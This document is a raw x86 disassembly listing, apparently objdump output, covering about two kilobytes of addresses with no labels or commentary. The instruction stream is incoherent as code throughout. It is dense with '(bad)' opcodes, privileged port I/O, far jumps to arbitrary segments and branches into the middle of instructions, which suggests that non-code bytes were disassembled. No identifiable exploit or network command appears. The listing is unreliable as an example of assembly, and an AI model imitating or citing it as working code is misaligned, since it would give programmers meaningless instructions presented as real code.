  418fa7:	mov    ebp,0x13e37759
  418fac:	test   al,0xce
  418fae:	inc    eax
  418faf:	ficom  DWORD PTR [edi+0x343915b0]
  418fb5:	sbb    al,0xbf
  418fb7:	jmp    0x172e:0xf76d56a1
  418fbe:	mov    ds:0x222082b5,al
  418fc3:	loopne 0x419039
  418fc5:	mov    dl,0x3b
  418fc7:	and    esi,DWORD PTR [ecx-0x64d5e030]
  418fcd:	or     BYTE PTR [eax+0x6a6e771d],0x2
  418fd4:	mov    esi,0xf6817fd6
  418fd9:	sbb    eax,DWORD PTR [esi]
  418fdb:	repnz cmp al,BYTE PTR cs:[eax]
  418fdf:	mov    bh,0x69
  418fe1:	outs   dx,DWORD PTR ds:[esi]
  418fe2:	sbb    BYTE PTR [ecx-0x1722681b],cl
  418fe8:	inc    ecx
  418fe9:	mov    DWORD PTR [ebx+0x1602621c],0x31e5042f
  418ff3:	retf   0x2574
  418ff6:	inc    edi
  418ff7:	add    ebx,DWORD PTR [ecx]
  418ff9:	jb     0x418fa5
  418ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ffc:	std    
  418ffd:	fdivr  QWORD PTR [ebp+0x6ec6618e]
  419003:	inc    eax
  419004:	sub    al,0x61
  419006:	lods   al,BYTE PTR ds:[esi]
  419007:	sbb    BYTE PTR [eax],ah
  419009:	mov    esi,0x65418d50
  41900e:	imul   eax,DWORD PTR [esp+edi*2-0x1d081b6a],0x82bcabe
  419019:	dec    esi
  41901a:	out    0xdb,al
  41901c:	push   eax
  41901d:	lahf   
  41901e:	cmp    eax,0xfb380f99
  419023:	cs dec ebx
  419025:	inc    edi
  419026:	inc    ebp
  419027:	sub    eax,0x5bb9e3bf
  41902c:	sahf   
  41902d:	pop    edi
  41902e:	dec    edx
  41902f:	(bad)  
  419030:	aam    0xe3
  419032:	hlt    
  419033:	jb     0x41905e
  419035:	xchg   edi,eax
  419036:	inc    edi
  419037:	sbb    DWORD PTR [ecx],ebx
  419039:	push   eax
  41903a:	jbe    0x419007
  41903c:	je     0x41904f
  41903e:	push   edx
  41903f:	in     eax,0x51
  419041:	push   ebp
  419042:	(bad)  
  419043:	push   edx
  419044:	mov    edx,eax
  419046:	cmp    ecx,ebx
  419048:	dec    esp
  419049:	hlt    
  41904a:	(bad)  
  41904b:	mov    ds:0x58699a8a,eax
  419050:	jae    0x419054
  419052:	xchg   esp,eax
  419053:	loop   0x4190c8
  419055:	and    al,0x1
  419057:	leave  
  419058:	jl     0x4190cc
  41905a:	ret    
  41905b:	fcomp  QWORD PTR [esi+0x3a616faf]
  419061:	jg     0x419092
  419063:	fst    DWORD PTR [eax+edi*4+0x7f]
  419067:	sbb    ecx,DWORD PTR [esi-0x7d]
  41906a:	repz inc ebx
  41906c:	retf   0x860f
  41906f:	test   BYTE PTR [edi+0x67],dh
  419072:	out    dx,al
  419073:	out    dx,al
  419074:	out    0x15,eax
  419076:	mov    eax,0xcf85ee99
  41907b:	imul   eax,DWORD PTR [eax+0x60],0xffffffb1
  41907f:	push   0xee8315d1
  419084:	xchg   esi,eax
  419085:	xlat   BYTE PTR ds:[ebx]
  419086:	jle    0x419014
  419088:	loope  0x419057
  41908a:	adc    ebp,DWORD PTR [edx+edx*1]
  41908d:	pop    edx
  41908e:	imul   esi,eax,0x4d
  419091:	inc    edi
  419092:	mov    esp,0xdd15e906
  419097:	xchg   edi,eax
  419098:	add    eax,0x78b4525e
  41909d:	(bad)  
  41909e:	gs push eax
  4190a0:	ficom  DWORD PTR gs:[eax+0x2fc22842]
  4190a7:	fs jmp 0x9abe:0x8e35deac
  4190af:	dec    ebp
  4190b0:	nop
  4190b1:	(bad)  
  4190b2:	mov    edx,0x191e8ed2
  4190b7:	loopne 0x419100
  4190b9:	out    0xe8,eax
  4190bb:	(bad)  
  4190bc:	cmc    
  4190bd:	mov    esp,0xb8306167
  4190c2:	mov    edi,0x4c1a2625
  4190c7:	mov    dl,0xca
  4190c9:	(bad)  
  4190ca:	hlt    
  4190cb:	aam    0xef
  4190cd:	mov    al,0xad
  4190cf:	fimul  WORD PTR [ecx-0x647e093b]
  4190d5:	daa    
  4190d6:	ds ret 0x4275
  4190da:	pop    edx
  4190db:	fmul   QWORD PTR [ecx+ebx*1+0x35c230b7]
  4190e2:	stos   BYTE PTR es:[edi],al
  4190e3:	adc    edx,DWORD PTR [edx]
  4190e5:	push   cs
  4190e6:	(bad)
  4190e9:	cli    
  4190ea:	xchg   edx,eax
  4190eb:	xor    esi,DWORD PTR [edx]
  4190ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190ee:	xlat   BYTE PTR ds:[ebx]
  4190ef:	les    ebp,FWORD PTR [ecx+eax*4-0x1c]
  4190f3:	or     esp,0x17
  4190f6:	rcr    bl,1
  4190f8:	leave  
  4190f9:	adc    BYTE PTR [edx],0x44
  4190fc:	rcl    esp,0x27
  4190ff:	add    al,0x7a
  419101:	enter  0x4110,0x47
  419105:	or     edx,edx
  419107:	data16 ja 0x4190a3
  41910a:	js     0x41917c
  41910c:	jg     0x4190f5
  41910e:	inc    esp
  41910f:	adc    cl,BYTE PTR [eax]
  419111:	outs   dx,DWORD PTR ds:[esi]
  419112:	xor    al,0xcd
  419114:	mov    eax,0xd9ab8876
  419119:	pop    edx
  41911a:	js     0x41916f
  41911c:	adc    eax,DWORD PTR [ebp-0x44]
  41911f:	rcl    esi,1
  419121:	fst    DWORD PTR [esi-0x47cb3309]
  419127:	jg     0x419164
  419129:	mov    esi,0x39cdcdf5
  41912e:	or     edx,esi
  419130:	inc    edx
  419131:	data16 jns 0x419156
  419134:	stos   BYTE PTR es:[edi],al
  419135:	nop
  419136:	sahf   
  419137:	xor    dl,BYTE PTR [edx+edi*1-0x45]
  41913b:	mov    cl,0x3c
  41913d:	cwde   
  41913e:	jmp    0xc2cc:0xaaff57a0
  419145:	add    ecx,edx
  419147:	push   eax
  419148:	mov    cs,WORD PTR [esi+eiz*1]
  41914b:	test   eax,0x73c90316
  419150:	xlat   BYTE PTR ds:[ebx]
  419151:	cmc    
  419152:	lahf   
  419153:	rol    BYTE PTR [esi+esi*4-0x1],0x34
  419158:	outs   dx,BYTE PTR ds:[esi]
  419159:	arpl   WORD PTR [edi+0xd19b606],cx
  41915f:	fst    DWORD PTR [esi+0x3a]
  419162:	call   0xdb53:0x28e03902
  419169:	das    
  41916a:	mov    dl,0x12
  41916c:	or     ebx,DWORD PTR [edx]
  41916e:	adc    DWORD PTR ds:[edi+0x67d3eb35],ecx
  419175:	mov    ds:0x807836,al
  41917a:	push   esp
  41917b:	dec    ecx
  41917c:	(bad)  
  41917d:	sub    ebp,DWORD PTR [edi]
  41917f:	into   
  419180:	adc    ecx,DWORD PTR [ebx+0x39]
  419183:	in     eax,dx
  419184:	mov    ch,0xb4
  419186:	dec    ebp
  419187:	stos   DWORD PTR es:[edi],eax
  419188:	adc    DWORD PTR [edx],esp
  41918a:	rcl    DWORD PTR [ebx+esi*8-0x1ad1f591],cl
  419191:	adc    al,0xad
  419193:	jmp    0xd2180643
  419198:	dec    ebx
  419199:	dec    ebp
  41919a:	enter  0x1764,0x7a
  41919e:	fisttp DWORD PTR [edx+0x5afa58dc]
  4191a4:	add    edi,0x1b
  4191a7:	sbb    eax,0x6fe7b43a
  4191ac:	xor    ch,BYTE PTR [esi-0x2a9632ac]
  4191b2:	xor    DWORD PTR [esi],0x285fd8e4
  4191b8:	cmp    eax,0x3052d947
  4191bd:	(bad)  
  4191be:	faddp  st(6),st
  4191c0:	fnsave [edi+0x2cbca455]
  4191c6:	cmp    DWORD PTR [edx-0x3a2ed3fe],eax
  4191cc:	cwde   
  4191cd:	pop    ss
  4191ce:	das    
  4191cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191d0:	lods   eax,DWORD PTR ds:[esi]
  4191d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d2:	fnstsw WORD PTR [eax+0xb54d49c]
  4191d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191d9:	mov    ds,esp
  4191db:	or     esi,0xf1d4c568
  4191e1:	or     al,0xca
  4191e3:	jbe    0x41916d
  4191e5:	push   edx
  4191e6:	inc    ebx
  4191e7:	pop    edx
  4191e8:	dec    esp
  4191e9:	fdiv   DWORD PTR [esi]
  4191eb:	or     BYTE PTR [edi+0x45078edc],bh
  4191f1:	pop    esi
  4191f2:	nop
  4191f3:	pop    es
  4191f4:	dec    ebp
  4191f5:	aad    0x2a
  4191f7:	cdq    
  4191f8:	ss sti 
  4191fa:	jbe    0x41922a
  4191fc:	pop    ebx
  4191fd:	fscale 
  4191ff:	shl    DWORD PTR [eax],cl
  419201:	arpl   bx,cx
  419203:	push   cs
  419204:	das    
  419205:	inc    ebp
  419206:	cdq    
  419207:	and    al,BYTE PTR [ebx]
  419209:	enter  0xe8ae,0xd7
  41920d:	in     eax,0xa9
  41920f:	arpl   WORD PTR [esi],bp
  419211:	sahf   
  419212:	adc    al,0xc1
  419214:	jne    0x419283
  419216:	mov    bh,0xa2
  419218:	add    eax,0x9e0c570e
  41921d:	inc    edx
  41921e:	or     eax,0x18950e62
  419223:	rol    BYTE PTR [eax-0x6bb0c22e],1
  419229:	inc    ecx
  41922a:	inc    edi
  41922b:	ret    
  41922c:	mov    edx,DWORD PTR [ebp+0x5fe97ed7]
  419232:	mov    ebp,0xd2f7e6aa
  419237:	adc    BYTE PTR [edi-0x16],dh
  41923a:	pop    ecx
  41923b:	add    al,0x6d
  41923d:	push   ebx
  41923e:	and    esp,ebx
  419240:	stos   DWORD PTR es:[edi],eax
  419241:	stos   BYTE PTR es:[edi],al
  419242:	les    esi,FWORD PTR gs:[ecx]
  419245:	mov    ch,cl
  419247:	cwde   
  419248:	inc    esp
  419249:	sub    eax,0x9b65420d
  41924e:	or     bh,BYTE PTR [esi-0x50]
  419251:	into   
  419252:	shr    BYTE PTR [edx+0x24],0x48
  419256:	push   ebx
  419257:	mul    BYTE PTR [esp+edx*1-0x4b4b2a45]
  41925e:	cli    
  41925f:	test   eax,esi
  419261:	je     0x4192a5
  419263:	jmp    0xefaa:0x8451129f
  41926a:	sub    eax,esi
  41926c:	pop    edx
  41926d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41926e:	xchg   esp,eax
  41926f:	lods   al,BYTE PTR gs:[esi]
  419271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419272:	push   0x1
  419274:	mov    dh,0x14
  419276:	pushf  
  419277:	retf   
  419278:	lahf   
  419279:	add    BYTE PTR [ebp+eax*8+0x64],cl
  41927d:	cld    
  41927e:	enter  0x154c,0x47
  419282:	scas   eax,DWORD PTR es:[edi]
  419283:	sbb    BYTE PTR [edi-0x17d62a47],al
  419289:	mov    bl,BYTE PTR ds:[esp+ebp*8-0x37]
  41928e:	int3   
  41928f:	retf   0x9321
  419292:	outs   dx,DWORD PTR ds:[esi]
  419293:	aaa    
  419294:	loope  0x419235
  419296:	dec    ebp
  419297:	jmp    0xcf91b9f3
  41929c:	inc    esp
  41929d:	in     al,0x50
  41929f:	pushf  
  4192a0:	leave  
  4192a1:	mov    bl,0xa3
  4192a3:	jl     0x419314
  4192a5:	in     eax,dx
  4192a6:	inc    edx
  4192a7:	dec    ebp
  4192a8:	call   0x5551877d
  4192ad:	inc    esp
  4192ae:	mov    esp,0x31fcf2dc
  4192b3:	ret    
  4192b4:	cdq    
  4192b5:	lods   eax,DWORD PTR ds:[esi]
  4192b6:	dec    edx
  4192b7:	mov    BYTE PTR [esp+eax*2-0x2538bb75],dl
  4192be:	scas   al,BYTE PTR es:[edi]
  4192bf:	and    DWORD PTR [edx-0x4],ebp
  4192c2:	data16 (bad) 
  4192c4:	div    eax
  4192c6:	shl    ebx,cl
  4192c8:	push   esp
  4192c9:	inc    eax
  4192ca:	fcmovbe st,st(3)
  4192cc:	leave  
  4192cd:	stos   DWORD PTR es:[edi],eax
  4192ce:	and    cl,dl
  4192d0:	fnstsw WORD PTR [esp+ecx*2-0x7c9b5a]
  4192d7:	mov    cl,0xdc
  4192d9:	push   cs
  4192da:	sahf   
  4192db:	lahf   
  4192dc:	into   
  4192dd:	or     edx,DWORD PTR [ecx-0x20a5a0ab]
  4192e3:	in     al,0x1f
  4192e5:	retf   0x3607
  4192e8:	push   edi
  4192e9:	(bad)  
  4192ea:	mov    BYTE PTR [esi-0x68],cl
  4192ed:	mov    bl,0xd5
  4192ef:	loop   0x4192b2
  4192f1:	or     DWORD PTR [edx-0x5c],edx
  4192f4:	pop    es
  4192f5:	daa    
  4192f6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192f8:	jmp    0x1a183a1d
  4192fd:	int    0xf9
  4192ff:	mov    dl,0x68
  419301:	push   0x9429ae86
  419306:	pop    edx
  419307:	push   ecx
  419308:	stos   DWORD PTR es:[edi],eax
  419309:	push   esi
  41930a:	in     eax,0x69
  41930c:	xchg   edi,eax
  41930d:	push   ebp
  41930e:	gs sahf 
  419310:	aam    0x78
  419312:	sub    ecx,DWORD PTR [esi+0x693aa2ac]
  419318:	inc    edi
  419319:	push   0x73
  41931b:	or     esp,0xffffff8c
  41931e:	add    BYTE PTR [eax-0x3721ffe4],0xe1
  419325:	cmp    al,0x28
  419327:	jno    0x4192d6
  419329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41932a:	mov    eax,0x537aae64
  41932f:	mov    eax,0xf79305bb
  419334:	jo     0x41934b
  419336:	or     DWORD PTR [esi-0x62],esi
  419339:	lahf   
  41933a:	push   esp
  41933b:	je     0x419372
  41933d:	mov    cl,0xb2
  41933f:	test   al,0x2f
  419341:	scas   eax,DWORD PTR es:[edi]
  419342:	push   0x1cef7490
  419347:	test   al,0x84
  419349:	dec    edi
  41934a:	xlat   BYTE PTR ds:[ebx]
  41934b:	arpl   sp,sp
  41934d:	and    BYTE PTR [eax+eiz*8+0x26],bl
  419351:	or     eax,esi
  419353:	add    eax,0x9cbe08bc
  419358:	mov    ah,0x4c
  41935a:	xlat   BYTE PTR ds:[ebx]
  41935b:	mov    esi,0xca8a0491
  419360:	iret   
  419361:	bound  esi,QWORD PTR fs:[eax-0x1ca2a607]
  419368:	jbe    0x4192f6
  41936a:	adc    al,0x15
  41936c:	test   eax,0x68b25315
  419371:	jge    0x41937c
  419373:	sbb    eax,0xfa5614df
  419378:	in     al,0x98
  41937a:	sbb    DWORD PTR [ebx-0x61],ecx
  41937d:	sahf   
  41937e:	sub    ebx,edi
  419380:	push   ss
  419381:	inc    edx
  419382:	les    esp,FWORD PTR ds:0x5a338c9d
  419388:	ret    
  419389:	lahf   
  41938a:	in     eax,0xd5
  41938c:	or     DWORD PTR [ebx+0x2b],0xc6196ec4
  419393:	dec    ebx
  419394:	fsubr  st,st(0)
  419396:	sub    BYTE PTR [ecx-0x1ca5305b],ah
  41939c:	jmp    0x97b5e33
  4193a1:	pop    DWORD PTR [ebp+0x7c]
  4193a4:	sub    al,0x2f
  4193a6:	sahf   
  4193a7:	dec    edx
  4193a8:	pop    esi
  4193a9:	xchg   esp,eax
  4193aa:	sub    eax,DWORD PTR [edi]
  4193ac:	inc    edi
  4193ad:	ret    0xa20a
  4193b0:	push   cs
  4193b1:	das    
  4193b2:	(bad)  
  4193b3:	mov    al,ds:0x750dd4d4
  4193b8:	dec    edi
  4193b9:	popa   
  4193ba:	out    dx,eax
  4193bb:	nop
  4193bc:	adc    al,0xb4
  4193be:	inc    eax
  4193bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c0:	loopne 0x41934d
  4193c2:	pop    eax
  4193c3:	and    al,0x2b
  4193c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193c6:	stos   BYTE PTR es:[edi],al
  4193c7:	in     al,dx
  4193c8:	jne    0x4193d2
  4193ca:	push   ecx
  4193cb:	repz add al,0x10
  4193ce:	fld    TBYTE PTR [edx-0x7eceb3f7]
  4193d4:	sbb    eax,0x9a28e3f9
  4193d9:	imul   DWORD PTR [ebx-0x13]
  4193dc:	add    esp,ebx
  4193de:	out    dx,al
  4193df:	cmp    BYTE PTR [eax+0x3ecbf632],bh
  4193e5:	pusha  
  4193e6:	loop   0x41945c
  4193e8:	or     DWORD PTR [edi+0x22b944a3],ebp
  4193ee:	pop    esi
  4193ef:	inc    eax
  4193f0:	pop    ss
  4193f1:	mov    esp,0x5cff14a2
  4193f6:	(bad)  [ebx+0x26a8c92e]
  4193fc:	das    
  4193fd:	inc    eax
  4193fe:	xchg   edi,eax
  4193ff:	cwde   
  419400:	dec    edi
  419401:	inc    esi
  419402:	adc    BYTE PTR [esi-0x16],dh
  419405:	inc    ebp
  419406:	pusha  
  419407:	push   esp
  419408:	pop    edi
  419409:	sub    esp,esp
  41940b:	pop    eax
  41940c:	(bad)  
  41940d:	clc    
  41940e:	sbb    eax,0x1ce5f786
  419413:	fucomi st,st(5)
  419415:	fisttp DWORD PTR [edx-0x6b731d05]
  41941b:	out    0x14,al
  41941d:	nop
  41941e:	push   0xffffffe0
  419420:	enter  0x1d88,0x3c
  419424:	out    dx,al
  419425:	inc    esi
  419426:	sbb    dl,BYTE PTR [eax+ebx*1]
  419429:	dec    esi
  41942a:	imul   esp
  41942c:	fimul  DWORD PTR [edi-0x6b]
  41942f:	mov    ch,0x66
  419431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419432:	psllw  mm1,QWORD PTR [edi+esi*4]
  419436:	push   ebp
  419437:	mov    ebp,0x832d2278
  41943c:	daa    
  41943d:	mov    edx,0xfddaec36
  419442:	pop    edx
  419443:	test   DWORD PTR [esi+ecx*4-0x48de7372],esp
  41944a:	(bad)  [edx-0x49]
  41944d:	jo     0x41941d
  41944f:	ds push ebx
  419451:	adc    esp,DWORD PTR ds:0xf61372f7
  419457:	mov    ebx,0x5863a693
  41945c:	(bad)
  41945f:	mov    cl,0xac
  419461:	neg    BYTE PTR [edi]
  419463:	arpl   ax,dx
  419465:	ret    0x37ea
  419468:	out    dx,eax
  419469:	jl     0x4194bf
  41946b:	pop    ss
  41946c:	inc    edx
  41946d:	stc    
  41946e:	inc    esp
  41946f:	aas    
  419470:	mov    al,0x7b
  419472:	cmp    ah,BYTE PTR [ecx]
  419474:	ja     0x41944e
  419476:	fmul   st(0),st
  419478:	test   al,0x5b
  41947a:	ret    
  41947b:	rol    BYTE PTR [ebp-0x400bc57],0xf
  419482:	cmp    DWORD PTR [ecx],0x807dc407
  419488:	aas    
  419489:	xor    dl,BYTE PTR [edi]
  41948b:	rcl    BYTE PTR [esp+eax*1],1
  41948e:	(bad)  
  41948f:	rcl    DWORD PTR [ebx+0x18],1
  419492:	cmp    ebx,DWORD PTR [eax+0x2558b89f]
  419498:	mov    esp,0xc98a37ca
  41949d:	arpl   WORD PTR [edi+0x5],sp
  4194a0:	sub    eax,0x3f42db43
  4194a5:	jmp    0x41944c
  4194a7:	dec    ecx
  4194a8:	mov    esi,0x2c67357f
  4194ad:	aaa    
  4194ae:	mov    BYTE PTR [ecx+esi*2],ch
  4194b1:	scas   al,BYTE PTR es:[edi]
  4194b2:	aaa    
  4194b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b4:	call   0xcec8:0xddf591dd
  4194bb:	imul   ecx,DWORD PTR [ecx],0xffffffa8
  4194be:	dec    eax
  4194bf:	outs   dx,DWORD PTR ds:[esi]
  4194c0:	sbb    eax,0x43280fea
  4194c5:	push   0xffffffd8
  4194c7:	outs   dx,BYTE PTR ds:[esi]
  4194c8:	das    
  4194c9:	es jle 0x419466
  4194cc:	sub    edi,esi
  4194ce:	mov    edi,0x51a3be6d
  4194d3:	in     al,0xb1
  4194d5:	mov    ebx,0xf89ace66
  4194da:	adc    bh,BYTE PTR [ebx]
  4194dc:	loope  0x419533
  4194de:	adc    edx,DWORD PTR [ecx-0x9]
  4194e1:	jle    0x419512
  4194e3:	(bad)  
  4194e4:	out    0xc4,al
  4194e6:	popa   
  4194e7:	jns    0x4194f4
  4194e9:	inc    eax
  4194ea:	jno    0x419478
  4194ec:	dec    eax
  4194ed:	js     0x419539
  4194ef:	mov    ebx,0xb75480bb
  4194f4:	ss inc edi
  4194f6:	mov    ebx,0xbab2a16b
  4194fb:	test   eax,0x6db7eb23
  419500:	out    0x98,eax
  419502:	leave  
  419503:	mov    cl,0xbb
  419505:	cmp    DWORD PTR gs:[eax+0xab1d3a],0x4e
  41950d:	sub    edx,DWORD PTR ss:[ebx*1+0x1311a930]
  419515:	fisttp WORD PTR [eax+eax*1+0x70]
  419519:	lea    esp,[edx-0x26a0a7d3]
  41951f:	daa    
  419520:	aam    0xc3
  419522:	cmp    eax,0x7ed71573
  419527:	mov    bh,ch
  419529:	test   eax,0xd40ef35f
  41952e:	sbb    al,0x41
  419530:	in     eax,0x68
  419532:	push   cs
  419533:	dec    ecx
  419534:	stc    
  419535:	mov    cl,0xea
  419537:	add    al,0x2e
  419539:	cdq    
  41953a:	ins    DWORD PTR es:[edi],dx
  41953b:	fcom   DWORD PTR [ebx-0x5166785]
  419541:	mov    al,ds:0x90084905
  419546:	sub    BYTE PTR [eax-0x4892c599],cl
  41954c:	fcomp  QWORD PTR [edi]
  41954e:	adc    eax,0xba0a010b
  419553:	ss jmp 0x4195b9
  419556:	xchg   ecx,eax
  419557:	mov    edi,0x629ceb33
  41955c:	ins    BYTE PTR es:[edi],dx
  41955d:	pop    ebx
  41955e:	out    dx,eax
  41955f:	mov    ebp,0x1b3ff400
  419564:	test   al,0x77
  419566:	pop    ecx
  419567:	aaa    
  419568:	rcr    DWORD PTR [ecx],cl
  41956a:	leave  
  41956b:	mov    eax,ds:0x893c6a4c
  419570:	ret    0x80af
  419573:	stos   BYTE PTR es:[edi],al
  419574:	int    0xf5
  419576:	jo     0x419509
  419578:	push   eax
  419579:	push   edx
  41957a:	mov    ds:0x64c93423,al
  41957f:	xor    edi,DWORD PTR [ecx-0x7]
  419582:	(bad)  
  419583:	in     al,0x59
  419585:	pop    eax
  419586:	add    ah,BYTE PTR ds:0x1be3d81
  41958c:	jg     0x419562
  41958e:	imul   eax,DWORD PTR [esp+ebx*1+0x4adf5551],0x7713325f
  419599:	fcomp  st(4)
  41959b:	push   esi
  41959c:	jmp    0xd5df9b62
  4195a1:	imul   ecx,DWORD PTR [ebx-0x3b5e69d0],0xffffffb1
  4195a8:	out    0x66,eax
  4195aa:	ins    BYTE PTR es:[edi],dx
  4195ab:	pop    ss
  4195ac:	push   esp
  4195ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ae:	stos   DWORD PTR es:[edi],eax
  4195af:	(bad)  
  4195b0:	fwait
  4195b1:	mov    dh,0x3a
  4195b3:	dec    ecx
  4195b4:	fbstp  TBYTE PTR [esi+esi*8+0x3c]
  4195b8:	pop    ss
  4195b9:	es push ebp
  4195bb:	pop    edi
  4195bc:	mov    eax,0xde35412e
  4195c1:	push   es
  4195c2:	jle    0x4195d7
  4195c4:	scas   al,BYTE PTR es:[edi]
  4195c5:	jmp    0x419611
  4195c7:	or     eax,0x2c0e9d0a
  4195cc:	cmp    dh,BYTE PTR [edx+0x7f]
  4195cf:	outs   dx,BYTE PTR ds:[esi]
  4195d0:	or     al,BYTE PTR [edx]
  4195d2:	xor    BYTE PTR [edi-0x6f],0x50
  4195d6:	pop    ss
  4195d7:	cmp    ecx,ebp
  4195d9:	dec    ebx
  4195da:	add    al,0x4c
  4195dc:	call   0x7328143b
  4195e1:	dec    edx
  4195e2:	in     al,0xb
  4195e4:	mov    ch,dh
  4195e6:	dec    esi
  4195e7:	rcr    BYTE PTR [edx],1
  4195e9:	mov    ds:0x11a6ecaa,eax
  4195ee:	and    ebx,esp
  4195f0:	and    bl,BYTE PTR [edi]
  4195f2:	imul   ebp,DWORD PTR [ecx+0x35],0x3863878f
  4195f9:	imul   ecx,DWORD PTR [edx+esi*4],0xb0e46b67
  419600:	test   DWORD PTR [ebx-0x31],esp
  419603:	test   eax,0x4cd3d86d
  419608:	pop    esi
  419609:	jmp    0x9bac:0xcf2cff94
  419610:	sbb    DWORD PTR [edi+0x47],esi
  419613:	loop   0x4195ba
  419615:	jb     0x4195cd
  419617:	or     DWORD PTR [esi-0x17989b40],eax
  41961d:	jbe    0x4195fa
  41961f:	lods   eax,DWORD PTR ds:[si]
  419621:	lea    esp,[esi]
  419623:	mov    ch,0x2f
  419625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419626:	mov    al,0xb3
  419628:	mov    bh,0x87
  41962a:	mov    al,ds:0xc72c98c8
  41962f:	int    0x73
  419631:	call   0xa4b0:0x55b8876a
  419638:	loop   0x4195c0
  41963a:	or     al,0xce
  41963c:	sahf   
  41963d:	sub    BYTE PTR [ecx-0x16c458a7],dh
  419643:	scas   al,BYTE PTR es:[edi]
  419644:	push   DWORD PTR [eax+esi*4+0xf3ab97f]
  41964b:	xor    bl,BYTE PTR [edi-0x61]
  41964e:	mov    edx,0x1aa2a2d8
  419653:	and    eax,0x88a83ad
  419658:	inc    eax
  419659:	shr    edx,1
  41965b:	pop    eax
  41965c:	stos   DWORD PTR es:[edi],eax
  41965d:	retf   0xb538
  419660:	jns    0x41966a
  419662:	add    BYTE PTR [eax-0x67],ch
  419665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419666:	imul   eax,DWORD PTR [edx-0x57],0x70
  41966a:	jecxz  0x4196cf
  41966c:	mov    edi,0x9b77c117
  419671:	sar    BYTE PTR [edi-0xe54cb18],0x8c
  419678:	sub    BYTE PTR [ebx-0x7c],bl
  41967b:	adc    al,0x7c
  41967d:	or     al,0x6c
  41967f:	cmp    DWORD PTR [ebp+0x38],0x76
  419683:	shl    BYTE PTR [ecx-0x48],1
  419686:	sbb    DWORD PTR [eax],esi
  419688:	not    DWORD PTR [edx+0x198f324b]
  41968e:	adc    eax,0x3d9ebbbb
  419693:	nop
  419694:	fmulp  st(4),st
  419696:	push   ss
  419697:	lock mov ds:0xfb1832b4,eax
  41969d:	and    al,0x4f
  41969f:	lahf   
  4196a0:	push   eax
  4196a1:	loopne 0x41966d
  4196a3:	out    dx,al
  4196a4:	inc    edi
  4196a5:	lock dec ebx
  4196a7:	xor    ah,BYTE PTR [edi-0x775e9747]
  4196ad:	push   edi
  4196ae:	xor    BYTE PTR [ebx],cl
  4196b0:	je     0x419632
  4196b2:	test   BYTE PTR [eax],0x4d
  4196b5:	pop    ebx
  4196b6:	ds jp  0x4196a7
  4196b9:	or     esi,DWORD PTR [esi]
  4196bb:	push   ss
  4196bc:	test   DWORD PTR [ecx],ecx
  4196be:	retf   0xa26e
  4196c1:	xchg   ebx,eax
  4196c2:	fucompp 
  4196c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c5:	clc    
  4196c6:	(bad)  
  4196c7:	clc    
  4196c8:	jmp    0xfa71:0x2fa6c535
  4196cf:	mov    ds:0xc723564,eax
  4196d4:	inc    esp
  4196d5:	jmp    0x4196c1
  4196d7:	cwde   
  4196d8:	inc    ecx
  4196d9:	imul   ebx,ebp,0x7c19dbbf
  4196df:	or     al,BYTE PTR [edi-0x1f558411]
  4196e5:	and    ecx,0x606b5e49
  4196eb:	aad    0xee
  4196ed:	mov    edi,0x364568b1
  4196f2:	shl    DWORD PTR [edi-0x6b],1
  4196f5:	popa   
  4196f6:	fisub  WORD PTR [eax-0x2ea941d7]
  4196fc:	xchg   si,ax
  4196fe:	mov    ds:0xaa34f75f,eax
  419703:	sub    BYTE PTR [eax],bl
  419705:	jb     0x4196ea
  419707:	or     dl,BYTE PTR [esp+ebx*2-0x5e]
  41970b:	ja     0x41975a
  41970d:	call   0x24fd6b4e
  419712:	mov    dl,0x39
  419714:	inc    edx
  419715:	add    eax,0x6f905567
  41971a:	ss sbb eax,0xb2f4deb6
  419720:	sub    eax,0x552d9dcf
  419725:	adc    bh,BYTE PTR [edi]
  419727:	int    0xe4
  419729:	mov    ds:0xa100f6a1,al
  41972e:	sub    cl,BYTE PTR [esi-0x32]
  419731:	pop    es
  419732:	jmp    0x89a0cd94
  419737:	pop    ds
  419738:	cmp    eax,0xb030413f
  41973d:	into   
  41973e:	cmp    ah,bl
  419740:	out    dx,eax
  419741:	jmp    0x8f4a2a53
  419746:	xchg   ebx,eax
  419747:	sbb    DWORD PTR [edx],eax
  419749:	and    esi,DWORD PTR [eax-0x2]
  41974c:	mov    ecx,0x5f03f22e
  419751:	repz inc eax
  419753:	mov    DWORD PTR es:[ecx+0x6c],edx
  419757:	mov    eax,0x3419b1d
  41975c:	inc    edx
  41975d:	xchg   esi,eax
  41975e:	fcomp  DWORD PTR [edi+0x197a901a]
  419764:	pop    ds
  419765:	pop    ds
  419766:	jb     0x4196ee
  419768:	jno    0x4197d6
  41976a:	psubb  mm4,QWORD PTR [esi]
  41976d:	pop    ebp
  41976e:	xor    ecx,ebp
  419770:	in     eax,0x48
  419772:	mov    al,0xbb
  419774:	cmp    ah,ch
  419776:	adc    al,0x3c
  419778:	inc    esi
  419779:	mov    al,0x67
  41977b:	add    BYTE PTR [ebx*4+0x11c59427],dl
  419782:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  419784:	gs scas al,BYTE PTR es:[edi]
  419786:	fisttp DWORD PTR [ebx]
  419789:	inc    eax
  41978a:	repz push 0x7dc107df
  419790:	add    eax,0xa9d8999f
  419795:	dec    ebp
  419796:	ret    0xa30c
  419799:	lea    edx,[ebx-0x459334f2]
  41979f:	(bad)  
  4197a0:	js     0x4197ac
  4197a2:	data16 add al,cl
  4197a5:	imul   ebp,esi,0xffffff97
  4197a8:	stc    
  4197a9:	ins    BYTE PTR es:[edi],dx
